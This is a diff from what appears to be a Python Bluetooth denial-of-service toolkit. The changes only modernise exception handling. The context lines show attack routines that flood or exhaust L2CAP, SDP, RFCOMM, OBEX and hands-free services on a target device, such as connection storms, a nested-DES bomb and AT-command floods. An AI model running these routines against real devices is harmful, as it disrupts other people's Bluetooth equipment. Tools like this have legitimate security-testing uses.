@@ -213,7 +213,7 @@ class L2CAPDoS:
                 sock.connect((self.target, PSM_SDP))
                 packets_sent += 1
                 sock.close()
-            except (OSError, socket.error):
+            except OSError:
                 warning(f"Connection failed at round {i + 1}, target may be exhausted")
                 return _make_result(self.target, "l2cap_connection_storm",
                                     packets_sent, start_time,
@@ -250,7 +250,7 @@ class L2CAPDoS:
                 sock.connect((self.target, PSM_SDP))
                 sockets.append(sock)
                 connected += 1
-            except (OSError, socket.error):
+            except OSError:
                 info(f"  Connection pool saturated at {connected} connections")
                 break
 
@@ -297,7 +297,7 @@ class L2CAPDoS:
 
         try:
             sock = _l2cap_connect(self.target, PSM_SDP, self.hci)
-        except (OSError, socket.error) as exc:
+        except OSError as exc:
             error(f"Failed to connect: {exc}")
             return _make_result(self.target, "data_flood", 0,
                                 start_time, "error", str(exc))
@@ -310,7 +310,7 @@ class L2CAPDoS:
                 try:
                     sock.send(payload[:payload_size])
                     packets_sent += 1
-                except (OSError, socket.error):
+                except OSError:
                     warning(f"  Send failed at packet {i + 1}, target may be overwhelmed")
                     return _make_result(self.target, "data_flood",
                                         packets_sent, start_time,
@@ -320,7 +320,7 @@ class L2CAPDoS:
                 try:
                     sock.settimeout(0.01)
                     sock.recv(1024)
-                except socket.timeout:
+                except TimeoutError:
                     pass
 
                 if (i + 1) % 100 == 0:
@@ -349,7 +349,7 @@ class L2CAPDoS:
 
         try:
             sock = _l2cap_connect(self.target, PSM_SDP, self.hci)
-        except (OSError, socket.error) as exc:
+        except OSError as exc:
             error(f"Failed to connect: {exc}")
             return _make_result(self.target, "sdp_request_flood", 0,
                                 start_time, "error", str(exc))
@@ -376,7 +376,7 @@ class L2CAPDoS:
                 try:
                     sock.send(pdu)
                     packets_sent += 1
-                except (OSError, socket.error):
+                except OSError:
                     warning(f"  Send failed at request {i + 1}")
                     return _make_result(self.target, "sdp_request_flood",
                                         packets_sent, start_time,
@@ -386,7 +386,7 @@ class L2CAPDoS:
                 try:
                     sock.settimeout(0.01)
                     sock.recv(1024)
-                except socket.timeout:
+                except TimeoutError:
                     pass
 
                 if (i + 1) % 100 == 0:
@@ -488,10 +488,10 @@ class SDPDoS:
                     try:
                         sock.settimeout(5)
                         sock.recv(1024)
-                    except socket.timeout:
+                    except TimeoutError:
                         pass
 
-                except (OSError, socket.error) as exc:
+                except OSError as exc:
                     warning(f"Connection {i} failed: {exc}")
                     if "Connection refused" in str(exc):
                         break
@@ -535,7 +535,7 @@ class SDPDoS:
 
         try:
             sock = _l2cap_connect(self.target, PSM_SDP, self.hci)
-        except (OSError, socket.error) as exc:
+        except OSError as exc:
             error(f"Failed to connect to SDP: {exc}")
             return _make_result(self.target, "large_service_search", 0,
                                 start_time, "error", str(exc))
@@ -554,7 +554,7 @@ class SDPDoS:
                 try:
                     sock.send(pdu)
                     packets_sent += 1
-                except (OSError, socket.error):
+                except OSError:
                     warning(f"Send failed at request {i}")
                     return _make_result(self.target, "large_service_search",
                                         packets_sent, start_time,
@@ -564,7 +564,7 @@ class SDPDoS:
                 try:
                     sock.settimeout(1)
                     sock.recv(4096)
-                except socket.timeout:
+                except TimeoutError:
                     pass
         finally:
             sock.close()
@@ -589,7 +589,7 @@ class SDPDoS:
 
         try:
             sock = _l2cap_connect(self.target, PSM_SDP, self.hci)
-        except (OSError, socket.error) as exc:
+        except OSError as exc:
             error(f"Failed to connect to SDP: {exc}")
             return _make_result(self.target, "nested_des_bomb", 0,
                                 start_time, "error", str(exc))
@@ -612,9 +612,9 @@ class SDPDoS:
             try:
                 sock.settimeout(5)
                 sock.recv(1024)
-            except socket.timeout:
+            except TimeoutError:
                 warning("No response to nested DES bomb (target may be parsing)")
-        except (OSError, socket.error) as exc:
+        except OSError as exc:
             warning(f"Send failed: {exc}")
             return _make_result(self.target, "nested_des_bomb",
                                 packets_sent, start_time,
@@ -664,7 +664,7 @@ class RFCOMMDoS:
 
         try:
             sock = _l2cap_connect(self.target, PSM_RFCOMM, self.hci)
-        except (OSError, socket.error) as exc:
+        except OSError as exc:
             error(f"Failed to connect to RFCOMM PSM: {exc}")
             return _make_result(self.target, "sabm_flood", 0,
                                 start_time, "error", str(exc))
@@ -679,7 +679,7 @@ class RFCOMMDoS:
             try:
                 sock.settimeout(5)
                 sock.recv(256)
-            except socket.timeout:
+            except TimeoutError:
                 warning("No UA for DLCI 0, continuing anyway")
 
             # SABM flood on DLCIs 2..count+1
@@ -689,7 +689,7 @@ class RFCOMMDoS:
                     sock.send(frame)
                     packets_sent += 1
                     info(f"  SABM sent for DLCI {dlci}")
-                except (OSError, socket.error):
+                except OSError:
                     warning(f"  Send failed at DLCI {dlci}, target may have crashed")
                     return _make_result(self.target, "sabm_flood",
                                         packets_sent, start_time,
@@ -699,7 +699,7 @@ class RFCOMMDoS:
                 try:
                     sock.settimeout(0.1)
                     sock.recv(256)
-                except socket.timeout:
+                except TimeoutError:
                     pass
         finally:
             sock.close()
@@ -721,7 +721,7 @@ class RFCOMMDoS:
 
         try:
             sock = _l2cap_connect(self.target, PSM_RFCOMM, self.hci)
-        except (OSError, socket.error) as exc:
+        except OSError as exc:
             error(f"Failed to connect to RFCOMM PSM: {exc}")
             return _make_result(self.target, "credit_exhaustion", 0,
                                 start_time, "error", str(exc))
@@ -735,7 +735,7 @@ class RFCOMMDoS:
             try:
                 sock.settimeout(5)
                 sock.recv(256)
-            except socket.timeout:
+            except TimeoutError:
                 pass
 
             # Open DLCIs with zero credits via PN (Parameter Negotiation)
@@ -758,7 +758,7 @@ class RFCOMMDoS:
                 try:
                     sock.send(frame)
                     packets_sent += 1
-                except (OSError, socket.error):
+                except OSError:
                     warning(f"PN send failed at DLCI {dlci}")
                     break
 
@@ -767,7 +767,7 @@ class RFCOMMDoS:
                 try:
                     sock.send(sabm)
                     packets_sent += 1
-                except (OSError, socket.error):
+                except OSError:
                     break
 
             # Hold session open
@@ -797,7 +797,7 @@ class RFCOMMDoS:
 
         try:
             sock = _l2cap_connect(self.target, PSM_RFCOMM, self.hci)
-        except (OSError, socket.error) as exc:
+        except OSError as exc:
             error(f"Failed to connect to RFCOMM PSM: {exc}")
             return _make_result(self.target, "mux_command_flood", 0,
                                 start_time, "error", str(exc))
@@ -811,7 +811,7 @@ class RFCOMMDoS:
             try:
                 sock.settimeout(5)
                 sock.recv(256)
-            except socket.timeout:
+            except TimeoutError:
                 pass
 
             # Flood Test commands on DLCI 0
@@ -826,7 +826,7 @@ class RFCOMMDoS:
                 try:
                     sock.send(frame)
                     packets_sent += 1
-                except (OSError, socket.error):
+                except OSError:
                     warning(f"  Send failed at command {i + 1}")
                     return _make_result(self.target, "mux_command_flood",
                                         packets_sent, start_time,
@@ -968,10 +968,10 @@ class OBEXDoS:
                     # Read response but keep connection open
                     try:
                         sock.recv(1024)
-                    except socket.timeout:
+                    except TimeoutError:
                         pass
 
-                except (OSError, socket.error) as exc:
+                except OSError as exc:
                     warning(f"Channel {channel} connection {i} failed: {exc}")
                     continue
 
@@ -1020,7 +1020,7 @@ class OBEXDoS:
                     sock.settimeout(10)
                     sock.connect((self.target, channel))
                     break
-                except (OSError, socket.error):
+                except OSError:
                     sock = None
                     continue
 
@@ -1040,7 +1040,7 @@ class OBEXDoS:
                 resp = sock.recv(1024)
                 if len(resp) < 3 or resp[0] != 0xA0:
                     warning("OBEX CONNECT rejected or unexpected response")
-            except socket.timeout:
+            except TimeoutError:
                 warning("No OBEX CONNECT response")
 
             # Alternate SETPATH forward and backward
@@ -1057,7 +1057,7 @@ class OBEXDoS:
                 try:
                     sock.send(pkt)
                     packets_sent += 1
-                except (OSError, socket.error):
+                except OSError:
                     warning(f"Send failed at SETPATH {i}")
                     return _make_result(self.target, "setpath_loop",
                                         packets_sent, start_time,
@@ -1067,7 +1067,7 @@ class OBEXDoS:
                 try:
                     sock.settimeout(0.5)
                     sock.recv(256)
-                except socket.timeout:
+                except TimeoutError:
                     pass
 
         finally:
@@ -1122,7 +1122,7 @@ class HFPDoS:
                                  BTPROTO_RFCOMM)
             sock.settimeout(10)
             sock.connect((self.target, channel))
-        except (OSError, socket.error) as exc:
+        except OSError as exc:
             error(f"Failed to connect to RFCOMM channel {channel}: {exc}")
             return _make_result(self.target, "at_command_flood", 0,
                                 start_time, "error", str(exc))
@@ -1143,9 +1143,9 @@ class HFPDoS:
                     try:
                         sock.settimeout(2)
                         sock.recv(512)
-                    except socket.timeout:
+                    except TimeoutError:
                         pass
-                except (OSError, socket.error):
+                except OSError:
                     pass
 
             # Flood AT commands
@@ -1157,7 +1157,7 @@ class HFPDoS:
                 try:
                     sock.send(cmd)
                     packets_sent += 1
-                except (OSError, socket.error):
+                except OSError:
                     warning(f"  Send failed at command {i + 1}, target may have crashed")
                     return _make_result(self.target, "at_command_flood",
                                         packets_sent, start_time,
@@ -1193,7 +1193,7 @@ class HFPDoS:
                                  BTPROTO_RFCOMM)
             sock.settimeout(10)
             sock.connect((self.target, channel))
-        except (OSError, socket.error) as exc:
+        except OSError as exc:
             error(f"Failed to connect to RFCOMM channel {channel}: {exc}")
             return _make_result(self.target, "slc_state_confusion", 0,
                                 start_time, "error", str(exc))
@@ -1253,9 +1253,9 @@ class HFPDoS:
                     try:
                         sock.settimeout(1)
                         sock.recv(512)
-                    except socket.timeout:
+                    except TimeoutError:
                         pass
-                except (OSError, socket.error):
+                except OSError:
                     warning(f"Send failed after {packets_sent} commands")
                     return _make_result(self.target, "slc_state_confusion",
                                         packets_sent, start_time,
